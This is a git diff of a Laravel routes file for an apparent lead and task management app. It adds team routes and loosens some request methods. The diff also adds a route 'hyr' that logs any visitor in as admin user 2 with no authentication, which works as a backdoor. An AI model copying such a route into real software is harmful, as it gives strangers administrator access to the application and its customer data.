@@ -8,7 +8,6 @@ use App\Http\Middleware\confirmedcode;
 use App\Mail\confirmcode as MailConfirmcode;
 use Carbon\Carbon;
 use App\Http\Controllers\TasksController;
-use App\Models\appointment;
 use Illuminate\Foundation\Auth\User;
 use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\ChatController;
@@ -21,10 +20,21 @@ use Spatie\Permission\Models\Permission;
 use App\Http\Controllers\FamilyPersonsController;
 use App\Http\Controllers\LeadDataController;
 use App\Http\Controllers\StatusController;
+use App\Http\Controllers\TeamController;
+use App\Models\lead;
+use Illuminate\Http\Request;
+use Illuminate\Contracts\Session\Session;
+use Musonza\Chat\Chat;
+
 
 use function GuzzleHttp\Promise\task;
 
 route::prefix('')->group(function(){
+// =====================================
+   route::get('hyr',function(){
+      Auth::guard('admins')->loginUsingId(2);
+   });
+//==========================================
    route::get('acceptapp/{id}',[UserController::class,'acceptapp']);
     route::get('closenots',[UserController::class,'closenots']);
     route::get('notifications',[UserController::class,'notifications']);
@@ -47,11 +57,8 @@ route::prefix('')->group(function(){
     route::get('leadfamily/{id}',function ($id){
       $data = \App\Models\lead::find($id);
       $data = $data->family;
-
-
       return view('leadfamily',compact('data'));
    })->name('leadfamily');
-
     route::get('leadfamilyperson/{id}',[FamilyPersonsController::class,'family_persons'])->name('leadfamilyperson');
     route::post('updateleadfamilyperson/{id}',[FamilyPersonsController::class,'updateleadfamilyperson'])->name('updateleadfamilyperson');
     route::get('allFamilyPersons/{id}',[FamilyPersonsController::class,'getAllFamilyPersonsOfLead'])->name('allFamilyPersonOfLead');
@@ -64,29 +71,26 @@ route::prefix('')->group(function(){
     route::post('updateLeadDataThings/{leadId}/{personId}',[LeadDataController::class,'updateLeadDataThings'])->name('updateLeadDataThings');
     route::post('createLeadDataPrevention/{leadId}/{personId}',[LeadDataController::class,'createLeadDataPrevention'])->name('createLeadDataPrevention');
     route::get('getAllLeadDataById/{leadId}/{personId}',[LeadDataController::class,'getAllLeadDataById'])->name('getAllLeadDataById');
-
-
     route::post('deleteLeadDataKK/{dataId}',[LeadDataController::class,'deleteLeadDataKK'])->name('deleteLeadDataKK');
     route::post('deleteLeadDataCounteroffered/{dataId}',[LeadDataController::class,'deleteLeadDataCounteroffered'])->name('deleteLeadDataCounteroffered');
     route::post('deleteLeadDataFahrzeug/{dataId}',[LeadDataController::class,'deleteLeadDataFahrzeug'])->name('deleteLeadDataFahrzeug');
     route::post('deleteLeadDataThings/{dataId}',[LeadDataController::class,'deleteLeadDataThings'])->name('deleteLeadDataThings');
     route::post('deleteLeadDataPrevention/{dataId}',[LeadDataController::class,'deleteLeadDataPrevention'])->name('deleteLeadDataPrevention');
-
-
+    route::post('deleteTeam/{teamId}',[TeamController::class,'deleteTeam'])->name('deleteTeam');
+    route::get('showTeamById/{teamId}',[TeamController::class,'showTeamById'])->name('showTeamById');
+    route::get('updateTeam/{teamId}',[TeamController::class,'updateTeam'])->name('updateTeam');
+    Route::group(['prefix' => 'team', 'middleware' => 'json.response'], function () {
+      route::post('create',[TeamController::class,'createTeam'])->name('createTeam');
+  });
    route::post('documentform/{id}',[TasksController::class,'documentform'])->name('documentform');
-   route::get('tasks',[TasksController::class,'tasks'])->name('tasks');
-
+   route::any('tasks',[TasksController::class,'tasks'])->name('tasks');
    route::get('searchword',[TasksController::class,'searchword'])->name('searchword');
-   route::get('costumers',function (){
-        $data = \App\Models\family::all();
-       return view('costumers',compact('data'));
-   })->name('costumers');
-   route::get('search',[TasksController::class,'costumers'])->name('search');
+   route::any('costumers',[TasksController::class,'costumers'])->name('costumers');
+   route::any('search',[TasksController::class,'costumers'])->name('search');
    route::get('ispending',[TasksController::class,'itis']);
    route::get('todayappointments',[TasksController::class,'today']);
    route::get('vuedate',[TasksController::class,'vuedate']);
    route::get('chat',[ChatController::class,'chat']);
-
    route::get('addtodo',[TodoController::class,'addtodo']);
    route::get('todos',[TodoController::class,'todos']);
    route::get('deletetodo',[TodoController::class,'deletetodo']);
@@ -98,7 +102,7 @@ route::prefix('')->group(function(){
    route::get('accepttask/{id}',[TasksController::class,'accepttask'])->name('accepttask');
    route::get('dates',[TasksController::class,'dates'])->name('dates');
 });
-route::get('assignpendency/{admin}/{id}',[TasksController::class,'assignpendency']);
+route::get('assignpendency/{admin}/{id}/{desc}',[TasksController::class,'assignpendency']);
    route::get('smsconfirm',function (){
       $Admin = Admins::find(12);
       return view('confirm_sms');
@@ -116,11 +120,6 @@ route::get('permission', function(){
   return $user->getRoleNames();
 });
 route::get('status',[StatusController::class,'status']);
-
-
-
-
-
 
 
 
